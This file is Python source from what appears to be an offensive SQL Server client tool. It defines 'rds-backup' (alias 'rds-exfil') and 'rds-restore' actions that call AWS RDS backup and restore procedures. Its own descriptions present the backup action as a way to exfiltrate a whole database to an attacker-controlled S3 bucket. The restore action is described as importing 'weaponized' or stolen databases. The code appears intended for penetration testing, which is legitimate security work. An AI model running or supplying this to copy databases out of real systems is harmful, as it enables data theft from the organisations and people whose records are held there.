# mssqlclient_ng/core/actions/cloud/rds/rds_backup.py

# Built-in imports
from typing import Any

# Third party imports
from loguru import logger

# Local library imports
from ...base import Arg, BaseAction
from ...factory import ActionFactory
from ....services.database import DatabaseContext
from .guard import requires_rds


@ActionFactory.register(
    "rds-backup",
    "Backup an RDS database to S3. Use for data exfiltration when the IAM role "
    "allows s3:PutObject to attacker-controlled buckets.",
    aliases=["rds-exfil"],
)
class RdsBackup(BaseAction):
    """
    Backup a database to S3 via rds_backup_database.

    If the IAM role attached to the RDS instance has overly permissive S3 write
    access, this enables full database exfiltration to an attacker-controlled bucket.
    """

    _database = Arg(
        position=0,
        short_name="d",
        long_name="db",
        required=True,
        description="Database to back up",
    )
    _s3_arn = Arg(
        position=1,
        short_name="s",
        long_name="s3-arn",
        required=True,
        description="Target S3 ARN, e.g. arn:aws:s3:::bucket/exfil.bak",
    )
    _type = Arg(
        short_name="t",
        long_name="type",
        default="FULL",
        description="Backup type: FULL or DIFFERENTIAL (default: FULL)",
    )
    _overwrite = Arg(
        long_name="overwrite",
        toggle=True,
        default=False,
        description="Overwrite existing S3 object",
    )
    _kms_key = Arg(
        short_name="k",
        long_name="kms-key",
        default="",
        description="KMS master key ARN for encryption",
    )

    def validate_arguments(self, additional_arguments: str = "") -> None:
        self._bind_arguments(additional_arguments)
        backup_type = str(self._type).upper()
        if backup_type not in ("FULL", "DIFFERENTIAL"):
            raise ValueError(f"Invalid backup type '{self._type}'. Use FULL or DIFFERENTIAL.")
        self._type = backup_type

    def execute(
        self, database_context: DatabaseContext
    ) -> dict[str, Any] | None:
        if not requires_rds(database_context):
            return None

        qs = database_context.query_service

        db = self._database.replace("'", "''")
        arn = self._s3_arn.replace("'", "''")
        overwrite = 1 if self._overwrite else 0

        logger.info(f"Backing up [{self._database}] -> {self._s3_arn}")

        optional = ""
        if self._kms_key:
            kms = self._kms_key.replace("'", "''")
            optional += f", @kms_master_key_arn = '{kms}'"

        query = (
            f"EXEC msdb.dbo.rds_backup_database "
            f"@source_db_name = '{db}', "
            f"@s3_arn_to_backup_to = '{arn}', "
            f"@overwrite_s3_backup_file = {overwrite}, "
            f"@type = '{self._type}'{optional};"
        )

        try:
            rows = qs.execute_table(query)
        except Exception as ex:
            logger.error(f"Backup failed: {ex}")
            return None

        if not rows:
            logger.warning("No task ID returned")
            return None

        task_id = rows[0].get("task_id")
        logger.success(f"Backup task started (task_id: {task_id})")
        logger.info("Monitor with: !rds-tasks")
        return rows[0]


@ActionFactory.register(
    "rds-restore",
    "Restore a database from an S3 backup on RDS.",
)
class RdsRestore(BaseAction):
    """
    Restore a database from S3 via rds_restore_database.

    Can import a weaponized database or restore a backup exfiltrated from
    another instance.
    """

    _database = Arg(
        position=0,
        short_name="d",
        long_name="db",
        required=True,
        description="Name for the restored database",
    )
    _s3_arn = Arg(
        position=1,
        short_name="s",
        long_name="s3-arn",
        required=True,
        description="S3 ARN of the backup file",
    )
    _type = Arg(
        short_name="t",
        long_name="type",
        default="FULL",
        description="Restore type: FULL or DIFFERENTIAL (default: FULL)",
    )
    _norecovery = Arg(
        long_name="norecovery",
        toggle=True,
        default=False,
        description="Restore with NORECOVERY (for applying differentials/logs later)",
    )

    def validate_arguments(self, additional_arguments: str = "") -> None:
        self._bind_arguments(additional_arguments)
        restore_type = str(self._type).upper()
        if restore_type not in ("FULL", "DIFFERENTIAL"):
            raise ValueError(f"Invalid restore type '{self._type}'. Use FULL or DIFFERENTIAL.")
        self._type = restore_type

    def execute(
        self, database_context: DatabaseContext
    ) -> dict[str, Any] | None:
        if not requires_rds(database_context):
            return None

        qs = database_context.query_service

        db = self._database.replace("'", "''")
        arn = self._s3_arn.replace("'", "''")
        norecovery = 1 if self._norecovery else 0

        logger.info(f"Restoring {self._s3_arn} -> [{self._database}]")

        query = (
            f"EXEC msdb.dbo.rds_restore_database "
            f"@restore_db_name = '{db}', "
            f"@s3_arn_to_restore_from = '{arn}', "
            f"@type = '{self._type}', "
            f"@with_norecovery = {norecovery};"
        )

        try:
            rows = qs.execute_table(query)
        except Exception as ex:
            logger.error(f"Restore failed: {ex}")
            return None

        if not rows:
            logger.warning("No task ID returned")
            return None

        task_id = rows[0].get("task_id")
        logger.success(f"Restore task started (task_id: {task_id})")
        logger.info("Monitor with: !rds-tasks")
        return rows[0]
